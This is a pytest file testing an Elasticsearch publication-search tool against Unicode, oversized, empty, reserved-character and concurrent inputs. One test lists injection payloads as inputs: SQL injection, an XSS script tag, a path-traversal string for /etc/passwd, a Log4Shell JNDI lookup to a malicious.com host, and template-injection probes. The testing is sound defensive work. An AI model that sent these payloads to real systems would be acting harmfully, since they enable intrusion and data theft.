"""
Edge Case Resilience Tests for Elasticsearch Tools

This module implements comprehensive edge case testing including Unicode handling,
large queries, boundary conditions, injection attempts, and other robustness scenarios.
"""

import pytest
import json
import time
from typing import Dict, Any, List, Optional
import concurrent.futures
from unittest.mock import patch, Mock

# Try to import the tools directly
try:
    from research_agent.tools.elasticsearch_tools import ElasticsearchTools
    DIRECT_IMPORT = True
except ImportError:
    from src.research_agent.tools.elasticsearch_tools import (
        search_publications,
        search_by_author,
        get_field_statistics,
        get_publication_details,
        get_statistics_summary,
        initialize_elasticsearch_tools
    )
    DIRECT_IMPORT = False

try:
    from .conftest import PERFORMANCE_THRESHOLDS
except ImportError:
    from tests.tools.conftest import PERFORMANCE_THRESHOLDS


class TestUnicodeAndInternational:
    """Test Unicode and international character handling."""
    
    def test_unicode_author_names(self, es_tools, edge_case_inputs):
        """Test author search with Unicode and international names."""
        unicode_authors = edge_case_inputs['unicode_authors']
        
        for author in unicode_authors:
            # Test all search strategies
            for strategy in ['exact', 'partial', 'fuzzy']:
                result = es_tools.search_by_author(author, strategy)
                
                # Should return valid JSON without errors
                assert isinstance(result, dict)
                assert 'total_hits' in result
                assert 'results' in result
                assert 'author' in result
                assert 'strategy' in result
                
                # Validate that the author name is preserved correctly
                assert result['author'] == author
                assert result['strategy'] == strategy
                
                # Results should be properly formatted
                if result['total_hits'] > 0:
                    for pub in result['results']:
                        assert 'id' in pub
                        assert 'title' in pub
                        assert 'authors' in pub
                        assert 'year' in pub
    
    def test_unicode_search_queries(self, es_tools, edge_case_inputs):
        """Test publication search with Unicode queries."""
        unicode_queries = [
            'naïve Bayes',
            'Schrödinger equation',
            'café résumé',
            'François Müller research',
            '机器学习',  # Chinese for "machine learning"
            'исследование',  # Russian for "research"
            'الذكاء الاصطناعي',  # Arabic for "artificial intelligence"
            'neurální sítě',  # Czech for "neural networks"
            'الگوریتم',  # Persian for "algorithm"
            'πρωτόκολλο'  # Greek for "protocol"
        ]
        
        for query in unicode_queries:
            result = es_tools.search_publications(query)
            
            # Should handle Unicode gracefully
            assert isinstance(result, dict)
            assert 'total_hits' in result
            assert 'results' in result
            assert 'query' in result
            
            # Query should be preserved correctly
            assert result['query'] == query
            
            # Results should be properly formatted
            if result['total_hits'] > 0:
                for pub in result['results']:
                    assert 'id' in pub
                    assert 'score' in pub
                    assert 'title' in pub
                    assert 'authors' in pub
                    assert 'year' in pub
                    assert 'abstract' in pub
    
    def test_mixed_case_handling(self, es_tools, edge_case_inputs):
        """Test handling of mixed case inputs."""
        mixed_case_queries = edge_case_inputs['mixed_case_queries']
        
        for query in mixed_case_queries:
            result = es_tools.search_publications(query)
            
            # Should handle mixed case without errors
            assert isinstance(result, dict)
            assert 'total_hits' in result
            assert result['query'] == query
            
            # Should still find results (case-insensitive search)
            # Note: Actual results depend on ES configuration
            assert result['total_hits'] >= 0


class TestLargeAndBoundaryInputs:
    """Test handling of large inputs and boundary conditions."""
    
    def test_large_query_strings(self, es_tools, edge_case_inputs):
        """Test handling of very large query strings."""
        large_queries = edge_case_inputs['large_queries']
        
        for query in large_queries:
            result = es_tools.search_publications(query)
            
            # Should handle large queries without crashing
            assert isinstance(result, dict)
            assert 'total_hits' in result
            assert 'results' in result
            assert 'query' in result
            
            # Query should be preserved (may be truncated by ES)
            assert len(result['query']) > 0
    
    def test_boundary_max_results(self, es_tools):
        """Test boundary values for max_results parameter."""
        boundary_values = [0, 1, 10, 50, 100, 1000, 10000]
        
        for max_results in boundary_values:
            result = es_tools.search_publications("test", max_results=max_results)
            
            # Should handle all boundary values
            assert isinstance(result, dict)
            assert 'total_hits' in result
            assert 'results' in result
            
            # Results should respect max_results limit
            if result['total_hits'] > 0:
                expected_count = min(max_results, result['total_hits'])
                assert len(result['results']) <= expected_count
    
    def test_boundary_aggregation_sizes(self, es_tools):
        """Test boundary values for aggregation size parameter."""
        boundary_sizes = [1, 5, 10, 50, 100, 1000, 10000]
        
        for size in boundary_sizes:
            result = es_tools.get_field_statistics("year", size=size)
            
            # Should handle all boundary sizes
            assert isinstance(result, dict)
            assert 'field' in result
            assert 'total_documents' in result
            assert 'top_values' in result
            
            # Results should respect size limit
            assert len(result['top_values']) <= size
    
    def test_deep_pagination(self, es_tools):
        """Test deep pagination performance and limits."""
        # Test various pagination depths
        pagination_tests = [
            {'max_results': 10, 'expected_performance': 2.0},
            {'max_results': 100, 'expected_performance': 3.0},
            {'max_results': 1000, 'expected_performance': 5.0},
        ]
        
        for test_case in pagination_tests:
            start_time = time.time()
            result = es_tools.search_publications("research", max_results=test_case['max_results'])
            duration = time.time() - start_time
            
            # Should complete within expected time
            assert duration < test_case['expected_performance']
            
            # Should return valid results
            assert isinstance(result, dict)
            assert 'total_hits' in result
            assert 'results' in result


class TestEmptyAndNullInputs:
    """Test handling of empty and null inputs."""
    
    def test_empty_string_inputs(self, es_tools, edge_case_inputs):
        """Test handling of empty string inputs."""
        empty_inputs = edge_case_inputs['empty_inputs']
        
        for empty_input in empty_inputs:
            if empty_input is None:
                continue  # Skip None values for string parameters
            
            # Test search_publications with empty input
            result = es_tools.search_publications(empty_input)
            assert isinstance(result, dict)
            assert 'total_hits' in result
            assert 'results' in result
            
            # Test search_by_author with empty input
            result = es_tools.search_by_author(empty_input, "partial")
            assert isinstance(result, dict)
            assert 'total_hits' in result
            assert 'results' in result
            assert 'author' in result
            assert 'strategy' in result
    
    def test_whitespace_only_inputs(self, es_tools):
        """Test handling of whitespace-only inputs."""
        whitespace_inputs = ["   ", "\t\t", "\n\n", "  \t  \n  "]
        
        for whitespace in whitespace_inputs:
            # Test search_publications
            result = es_tools.search_publications(whitespace)
            assert isinstance(result, dict)
            assert 'total_hits' in result
            
            # Test search_by_author
            result = es_tools.search_by_author(whitespace, "partial")
            assert isinstance(result, dict)
            assert 'total_hits' in result
    
    def test_null_and_none_handling(self, es_tools):
        """Test handling of null and None values."""
        # Test None values where possible
        test_cases = [
            lambda: es_tools.search_publications(""),
            lambda: es_tools.search_by_author("", "partial"),
            lambda: es_tools.get_field_statistics("year", size=10),
            lambda: es_tools.get_publication_details("nonexistent"),
        ]
        
        for test_func in test_cases:
            result = test_func()
            # Should not raise exceptions, should return dict
            assert isinstance(result, dict)


class TestSpecialCharacterHandling:
    """Test handling of special characters and potential injection attempts."""
    
    def test_special_characters_in_queries(self, es_tools, edge_case_inputs):
        """Test handling of special characters in search queries."""
        special_char_queries = edge_case_inputs['special_characters']
        
        for query in special_char_queries:
            result = es_tools.search_publications(query)
            
            # Should handle special characters gracefully
            assert isinstance(result, dict)
            assert 'total_hits' in result
            assert 'results' in result
            assert 'query' in result
            
            # Query should be preserved
            assert result['query'] == query
            
            # Should not cause errors
            assert 'error' not in result
    
    def test_elasticsearch_reserved_characters(self, es_tools):
        """Test handling of Elasticsearch reserved characters."""
        reserved_chars = [
            '+ - = && || > < ! ( ) { } [ ] ^ " ~ * ? : \\ /',
            'field:value',
            'title:"exact phrase"',
            'author:(John OR Jane)',
            'year:[2020 TO 2023]',
            'title:machine AND author:learning',
            'NOT artificial',
            'machine* AND learn?',
            'title:/joh?n(ath[oa]n)/',
            'field:value^2',
            'title:"phrase"~2',
            'author:smith~'
        ]
        
        for query in reserved_chars:
            result = es_tools.search_publications(query)
            
            # Should handle reserved characters without crashing
            assert isinstance(result, dict)
            assert 'total_hits' in result
            
            # May have 0 results but should not error
            assert result['total_hits'] >= 0
    
    def test_potential_injection_attempts(self, es_tools):
        """Test resilience against potential injection attempts."""
        injection_attempts = [
            "'; DROP TABLE users; --",
            "OR 1=1",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "null",
            "undefined",
            "NaN",
            "Infinity",
            "${jndi:ldap://malicious.com/}",
            "{{7*7}}",
            "<%=7*7%>",
            "{7*7}",
            "#{7*7}",
            "${{7*7}}",
            "#{${7*7}}",
            "${7*7}",
            "@{7*7}",
            "#{7*7}",
            "$[7*7]",
            "\\x00\\x01\\x02",
            "\\u0000\\u0001\\u0002"
        ]
        
        for injection in injection_attempts:
            # Test search_publications
            result = es_tools.search_publications(injection)
            assert isinstance(result, dict)
            assert 'total_hits' in result
            assert 'error' not in result  # Should not cause errors
            
            # Test search_by_author
            result = es_tools.search_by_author(injection, "partial")
            assert isinstance(result, dict)
            assert 'total_hits' in result
            assert 'error' not in result
            
            # Test get_publication_details
            result = es_tools.get_publication_details(injection)
            assert isinstance(result, dict)
            # May have error for invalid ID, but should not crash


class TestConcurrentEdgeCases:
    """Test edge cases under concurrent load."""
    
    def test_concurrent_large_queries(self, es_tools, concurrent_executor):
        """Test concurrent execution of large queries."""
        large_query = "machine learning artificial intelligence " * 100
        
        def run_large_query():
            return es_tools.search_publications(large_query)
        
        # Run 5 concurrent large queries
        query_args = [() for _ in range(5)]
        results, errors = concurrent_executor(run_large_query, query_args, max_workers=5)
        
        # All queries should complete successfully
        assert len(errors) == 0, f"Concurrent large queries failed: {errors}"
        assert len(results) == 5
        
        # All results should be valid
        for result in results:
            assert isinstance(result, dict)
            assert 'total_hits' in result
            assert 'results' in result
    
    def test_concurrent_unicode_queries(self, es_tools, concurrent_executor):
        """Test concurrent execution of Unicode queries."""
        unicode_queries = [
            'naïve Bayes',
            'Schrödinger equation',
            'café résumé',
            'François Müller',
            '机器学习'
        ]
        
        def run_unicode_query(query):
            return es_tools.search_publications(query)
        
        query_args = [(query,) for query in unicode_queries]
        results, errors = concurrent_executor(run_unicode_query, query_args, max_workers=5)
        
        # All queries should complete successfully
        assert len(errors) == 0, f"Concurrent Unicode queries failed: {errors}"
        assert len(results) == len(unicode_queries)
        
        # All results should be valid
        for result in results:
            assert isinstance(result, dict)
            assert 'total_hits' in result
    
    def test_concurrent_edge_case_mix(self, es_tools, concurrent_executor):
        """Test concurrent execution of mixed edge cases."""
        mixed_operations = [
            lambda: es_tools.search_publications(""),  # Empty query
            lambda: es_tools.search_publications("machine learning " * 50),  # Large query
            lambda: es_tools.search_by_author("François Müller", "fuzzy"),  # Unicode
            lambda: es_tools.search_publications("C++ programming"),  # Special chars
            lambda: es_tools.get_field_statistics("year", size=100),  # Large aggregation
            lambda: es_tools.get_publication_details("invalid_id"),  # Invalid ID
        ]
        
        def run_mixed_operation(operation):
            return operation()
        
        operation_args = [(op,) for op in mixed_operations]
        results, errors = concurrent_executor(run_mixed_operation, operation_args, max_workers=6)
        
        # Most operations should complete successfully
        success_rate = len(results) / (len(results) + len(errors))
        assert success_rate >= 0.8, f"Too many failures in mixed edge cases: {success_rate:.2%}"
        
        # All results should be valid dictionaries
        for result in results:
            assert isinstance(result, dict)


class TestPerformanceUnderStress:
    """Test performance characteristics under stress conditions."""
    
    def test_memory_usage_with_large_results(self, es_tools, performance_monitor):
        """Test memory usage with large result sets."""
        measurement = performance_monitor.start_measurement("large_results", "memory_test")
        
        try:
            # Request large result set
            result = es_tools.search_publications("research", max_results=1000)
            
            # Should complete successfully
            assert isinstance(result, dict)
            assert 'total_hits' in result
            assert 'results' in result
            
            # Check that we got a reasonable number of results
            if result['total_hits'] > 0:
                assert len(result['results']) <= 1000
            
            # End measurement
            perf_result = performance_monitor.end_measurement(measurement)
            
            # Memory usage should be reasonable
            assert perf_result['memory_delta'] < 100  # Less than 100MB
            
        except Exception as e:
            performance_monitor.end_measurement(measurement)
            raise e
    
    def test_response_time_with_complex_queries(self, es_tools, performance_monitor):
        """Test response time with complex queries."""
        complex_queries = [
            "machine learning AND artificial intelligence",
            "neural networks OR deep learning",
            "research AND (algorithm OR method)",
            "author:smith AND year:2023",
            "title:optimization AND abstract:performance"
        ]
        
        for query in complex_queries:
            measurement = performance_monitor.start_measurement("complex_query", "response_time")
            
            try:
                result = es_tools.search_publications(query)
                
                # Should complete successfully
                assert isinstance(result, dict)
                assert 'total_hits' in result
                
                # End measurement
                perf_result = performance_monitor.end_measurement(measurement)
                
                # Should complete within reasonable time
                assert perf_result['duration'] < 5.0  # Less than 5 seconds
                
            except Exception as e:
                performance_monitor.end_measurement(measurement)
                raise e
    
    def test_sustained_load_performance(self, es_tools, performance_monitor):
        """Test performance under sustained load."""
        # Run many queries in sequence
        queries = ["test", "research", "analysis", "method", "algorithm"] * 20
        
        durations = []
        memory_deltas = []
        
        for i, query in enumerate(queries):
            measurement = performance_monitor.start_measurement(f"sustained_load_{i}", "query")
            
            try:
                result = es_tools.search_publications(query)
                
                # Should complete successfully
                assert isinstance(result, dict)
                assert 'total_hits' in result
                
                # End measurement
                perf_result = performance_monitor.end_measurement(measurement)
                
                durations.append(perf_result['duration'])
                memory_deltas.append(perf_result['memory_delta'])
                
            except Exception as e:
                performance_monitor.end_measurement(measurement)
                raise e
        
        # Analyze performance trends
        avg_duration = sum(durations) / len(durations)
        avg_memory = sum(memory_deltas) / len(memory_deltas)
        
        # Performance should remain stable
        assert avg_duration < 3.0  # Average less than 3 seconds
        assert avg_memory < 20.0  # Average memory delta less than 20MB
        
        # No significant performance degradation
        first_half_avg = sum(durations[:50]) / 50
        second_half_avg = sum(durations[50:]) / 50
        
        # Second half should not be significantly slower
        assert second_half_avg < first_half_avg * 1.5  # No more than 50% slower